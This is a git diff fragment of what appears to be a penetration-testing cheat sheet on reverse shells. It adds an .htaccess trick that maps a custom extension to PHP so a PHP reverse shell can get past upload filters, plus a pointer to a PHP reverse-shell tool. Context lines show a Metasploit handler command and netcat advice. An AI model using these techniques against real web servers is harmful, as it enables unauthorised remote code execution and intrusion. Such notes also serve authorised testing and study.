@@ -8,6 +8,13 @@
 ### <ins>Quick Note</ins>
 
 ```
+If you have the ability to upload to a site a php reverse shell, but it doesn't like .php extension, another options is to do this first:
+
+echo "AddType application/x-httpd-php .dork" > .htaccess
+
+
+------
+
 
 Some people have luck using this to provide a cleaner shell, etc...doesn't seem to always work. At least use rlwrap with nc, if nothing else.
 
@@ -172,6 +179,10 @@ msfconsole -q -x "use multi/handler; set payload cmd/unix/reverse_python; set lh
 ### <ins>Web-Based Payloads</ins>
 
 #### **PHP**
+
+https://github.com/ivan-sincek/php-reverse-shell
+
+Here: /opt/php-reverse-shell
 
 ##### Reverse shel**l**
 
